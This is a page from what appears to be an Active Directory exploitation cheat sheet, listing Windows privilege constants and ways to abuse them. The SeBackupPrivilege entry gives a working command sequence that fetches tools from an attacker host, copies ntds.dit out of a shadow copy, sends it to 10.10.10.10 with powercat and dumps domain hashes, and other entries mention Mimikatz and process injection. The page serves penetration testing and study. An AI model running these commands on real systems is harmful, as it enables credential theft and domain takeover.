## Privileged Accounts and Groups in Active Directory

### Your Best Friend
```powershell
whoami /PRIV
```

### User Rights and Privileges

| User Right in Group Policy | Name of Constant|
| - | - |
| Access Credential Manager as a trusted caller | SeTrustedCredManAccessPrivilege|
| Access this computer from the network | SeNetworkLogonRight|
| Act as part of the operating system | SeTcbPrivilege|
| Add workstations to domain | SeMachineAccountPrivilege|
| Adjust memory quotas for a process | SeIncreaseQuotaPrivilege|
| Allow log on locally | SeInteractiveLogonRight|
| Allow log on through Terminal Services | SeRemoteInteractiveLogonRight|
| Back up files and directories | SeBackupPrivilege|
| Bypass traverse checking | SeChangeNotifyPrivilege|
| Change the system time | SeSystemtimePrivilege|
| Change the time zone | SeTimeZonePrivilege|
| Create a pagefile | SeCreatePagefilePrivilege|
| Create a token object | SeCreateTokenPrivilege|
| Create global objects | SeCreateGlobalPrivilege|
| Create permanent shared objects | SeCreatePermanentPrivilege|
| Create symbolic links | SeCreateSymbolicLinkPrivilege|
| Debug programs | SeDebugPrivilege|
| Deny access to this computer from the network | SeDenyNetworkLogonRight|
| Deny log on as a batch job | SeDenyBatchLogonRight|
| Deny log on as a service | SeDenyServiceLogonRight|
| Deny log on locally | SeDenyInteractiveLogonRight|
| Deny log on through Terminal Services | SeDenyRemoteInteractiveLogonRight|
| Enable computer and user accounts to be trusted for delegation | SeEnableDelegationPrivilege|
| Force shutdown from a remote system | SeRemoteShutdownPrivilege|
| Generate security audits | SeAuditPrivilege|
| Impersonate a client after authentication | SeImpersonatePrivilege|
| Increase a process working set | SeIncreaseWorkingSetPrivilege|
| Increase scheduling priority | SeIncreaseBasePriorityPrivilege|
| Load and unload device drivers | SeLoadDriverPrivilege|
| Lock pages in memory | SeLockMemoryPrivilege|
| Log on as a batch job | SeBatchLogonRight|
| Log on as a service | SeServiceLogonRight|
| Manage auditing and security log | SeSecurityPrivilege|
| Modify an object label | SeRelabelPrivilege|
| Modify firmware environment values | SeSystemEnvironmentPrivilege|
| Perform volume maintenance tasks | SeManageVolumePrivilege|
| Profile single process | SeProfileSingleProcessPrivilege|
| Profile system performance | SeSystemProfilePrivilege|
| Remove computer from docking station | SeUndockPrivilege|
| Replace a process level token | SeAssignPrimaryTokenPrivilege|
| Restore files and directories | SeRestorePrivilege|
| Shut down the system | SeShutdownPrivilege|
| Synchronize directory service data | SeSyncAgentPrivilege|
| Take ownership of files or other objects | SeTakeOwnershipPrivilege

---
### SePwnVector

- ##### SeTrustedCredManAccessPrivilege

- ##### SeNetworkLogonRight

- ##### SeTcbPrivilege
    - S4U Logon
        - Act as part of the operating system.
        - Allows a process to assume the identity of any user and thus gain access to the resources that the user is authorized to access.
    - PTOKEN_GROUPS parameter in LsaLogonUser() can be modified 
        - The calling process may request that arbitrary additional accesses be put in the access token.
    - Impersonate threads or processes

- ##### SeMachineAccountPrivilege

- ##### SeIncreaseQuotaPrivilege

- ##### SeInteractiveLogonRight

- ##### SeRemoteInteractiveLogonRight

- ##### SeBackupPrivilege
    - Allows the user to circumvent file and directory permissions to backup the system. The privilege is selected only when the application attempts to access through the NTFS backup application interface. Otherwise normal file and directory permissions apply.”
    - `reg save HKLM\SYSTEM c:\temp\system.hive`
    - `reg save HKLM\SAM c:\temp\sam.hive`
    - `secretsdump.py -sam sam.hive -system system.hive LOCAL`
    - NinjaCopy
    - Abusing Backup Operators Group with shadow copy
        ```powershell
        # Create  script.txt file that will contain the shadow copy process script
        #Script ->{
        set context persistent nowriters  
        set metadata c:\windows\system32\spool\drivers\color\example.cab  
        set verbose on  
        begin backup  
        add volume c: alias mydrive  
        
        create  
        
        expose %mydrive% w:  
        end backup  
        #}
        
        # TRANSFERT TO TARGET SYSTEM
        Invoke-WebRequest -Uri "http://10.10.10.10/script.txt" -OutFile "C:\\windows\\system32\\spool\\drivers\\color\\script.txt"
        
        # EXEC DISKSHADOW
        cd C:\windows\system32\spool\drivers\color
        diskshadow.exe -s script.txt
        
        # CHECK THE CAB
        ls
        -a----         6/7/2020   9:31 PM            743 example.cab
        
        # IMPORTING DLL SeBackupPrivilegeCmdLets & SeBackupPrivilegeUtils
        Invoke-WebRequest -Uri "http://10.10.10.10/SeBackupPrivilegeCmdLets.dll" -OutFile "C:\\windows\\system32\\spool\\drivers\\color\\SeBackupPrivilegeCmdLets.dll"
        Invoke-WebRequest -Uri "http://10.10.10.10/SeBackupPrivilegeUtils.dll" -OutFile "C:\\windows\\system32\\spool\\drivers\\color\\SeBackupPrivilegeUtils.dll"
        Import-Module .\SeBackupPrivilegeCmdLets.dll
        Import-Module .\SeBackupPrivilegeUtils.dll
        
        # CHECK MODULE
        get-help SeBackupPrivilege
        Name                              Category  Module                    Synopsis
        ----                              --------  ------                    --------
        Get-SeBackupPrivilege             Cmdlet    SeBackupPrivilegeCmdLets  ...
        Set-SeBackupPrivilege             Cmdlet    SeBackupPrivilegeCmdLets  ...
        Copy-FileSeBackupPrivilege        Cmdlet    SeBackupPrivilegeCmdLets  ...
        
        #Use the functionality of the dlls to copy the ntds.dit database file from the shadow copy to a location of our choice
        Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\Windows\temp\ntds.dit -Overwrite
        
        # Dump ACTUAL SYSTEM hive
        reg.exe save HKLM\SYSTEM c:\temp\system.hive 
        
        # FILE TRANSFERT
        powercat -c 10.10.10.10 -p 443 -i c:\Windows\temp\system.hive
        powercat -c 10.10.10.10 -p 443 -i c:\Windows\temp\ntds.dit
        
        # REBUILD AD HASHES
        secretsdump.py -ntds ntds.dit -system system.hive LOCAL
        Impacket v0.9.21.dev1+20200313.160519.0056b61c - Copyright 2020 SecureAuth Corporation
        
        [*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
        [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
        [*] Searching for pekList, be patient
        [*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
        [*] Reading and decrypting hashes from ntds.dit 
        Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
        DC01$:1000:aad3b435b51404eeaad3b435b51404ee:65557f7ad03ac340a7eb12b9462f80d6:::
        krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
        ...
        ```
    - If you have SeBackup & SeRestoreprivileges(Backup Operators group) you can set permission and ownership on each file & folder.

- ##### SeChangeNotifyPrivilege

- ##### SeSystemtimePrivilege

- ##### SeTimeZonePrivilege

- ##### SeCreatePagefilePrivilege

- ##### SeCreateTokenPrivilege
    - Allows a process to create an access token by calling token-creating APIs.
    - Create a custom token with all privileges and group membership.

- ##### SeCreateGlobalPrivilege

- ##### SeCreatePermanentPrivilege

- ##### SeCreateSymbolicLinkPrivilege

- ##### SeDebugPrivilege
    - Create a new process and set the parent process a privileged process.
    - Allows the holder to debug another process.
    - Permits read/write memory and change properties of any process (including Local System, administrator...) 
    - Load Mimikatz.
    - Inject code into privileged processes in order to perform privileged tasks (VirtualAlloc(), WriteProcessMemory(), CreateRemoteThread(),...)

- ##### SeDenyNetworkLogonRight

- ##### SeDenyBatchLogonRight

- ##### SeDenyServiceLogonRight

- ##### SeDenyInteractiveLogonRight

- ##### SeDenyRemoteInteractiveLogonRight

- ##### SeEnableDelegationPrivilege

- ##### SeRemoteShutdownPrivilege

- ##### SeAuditPrivilege

- ##### SeImpersonatePrivilege

- ##### SeIncreaseWorkingSetPrivilege

- ##### SeIncreaseBasePriorityPrivilege

- ##### SeLoadDriverPrivilege

- ##### SeLockMemoryPrivilege

- ##### SeBatchLogonRight

- ##### SeServiceLogonRight

- ##### SeSecurityPrivilege

- ##### SeRelabelPrivilege

- ##### SeSystemEnvironmentPrivilege

- ##### SeManageVolumePrivilege

- ##### SeProfileSingleProcessPrivilege

- ##### SeSystemProfilePrivilege

- ##### SeUndockPrivilege

- ##### SeAssignPrimaryTokenPrivilege

- ##### SeRestorePrivilege
    - Allows a user to circumvent file and directory permissions when restoring backed-up files and directories“ (but also registry keys)
    - Can write files anywhere, overwrites files, protected system files - even those protected by TrustedInstaller, registry entries...
    - Create a Service DLL.
    - Overwrite Service config in Registry

- ##### SeShutdownPrivilege

- ##### SeSyncAgentPrivilege

- ##### SeTakeOwnershipPrivilege
    - Allows the user to take ownership of any securable object in the system.
    -  (SE_OBJECT_TYPE): Files, Printers, Shares, Services, Registry, Kernel objects...
    - SeRestorePrivilege apply.
    - Change Permissions on Registry Key.

[<- BACK TO MAIN MENU ->](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/README.md)